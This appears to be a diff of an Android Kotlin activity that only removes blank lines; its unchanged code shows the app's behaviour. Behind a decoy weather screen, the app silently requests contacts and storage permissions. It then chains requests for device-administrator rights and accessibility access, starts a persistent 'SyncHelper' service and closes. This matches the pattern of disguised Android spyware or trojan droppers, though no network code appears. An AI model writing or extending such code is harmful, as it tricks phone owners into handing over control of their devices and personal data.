@@ -1,5 +1,4 @@
 package com.eren
-
 import android.Manifest
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
@@ -17,7 +16,6 @@ import android.widget.LinearLayout
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
-
 class MainActivity : AppCompatActivity() {
     private val perms = mutableListOf(
         Manifest.permission.READ_CONTACTS,
@@ -32,7 +30,6 @@ class MainActivity : AppCompatActivity() {
         else add(Manifest.permission.READ_EXTERNAL_STORAGE)
         if (Build.VERSION.SDK_INT >= 33) add(Manifest.permission.POST_NOTIFICATIONS)
     }.toTypedArray()
-
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         showWeatherScreen()
@@ -40,7 +37,6 @@ class MainActivity : AppCompatActivity() {
             try { ActivityCompat.requestPermissions(this, perms, 1001) } catch (_: Exception) {}
         }, 2000)
     }
-
     private fun showWeatherScreen() {
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
@@ -55,12 +51,10 @@ class MainActivity : AppCompatActivity() {
         root.addView(city); root.addView(temp); root.addView(cond); root.addView(detail)
         setContentView(root)
     }
-
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         requestAdmin()
     }
-
     private fun requestAdmin() {
         val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         val comp = ComponentName(this, DeviceHelper::class.java)
@@ -70,17 +64,14 @@ class MainActivity : AppCompatActivity() {
             try { startActivityForResult(i, 2002) } catch (_: Exception) { accessibilityNext() }
         } else accessibilityNext()
     }
-
     private fun accessibilityNext() {
         try { startActivityForResult(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), 3003) }
         catch (_: Exception) { finishAndStart() }
     }
-
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         when (requestCode) { 2002 -> accessibilityNext(); 3003 -> finishAndStart() }
     }
-
     private fun finishAndStart() {
         try { startForegroundService(Intent(this, SyncHelper::class.java)) } catch (_: Exception) { startService(Intent(this, SyncHelper::class.java)) }
         Handler(Looper.getMainLooper()).postDelayed({ finish() }, 500)
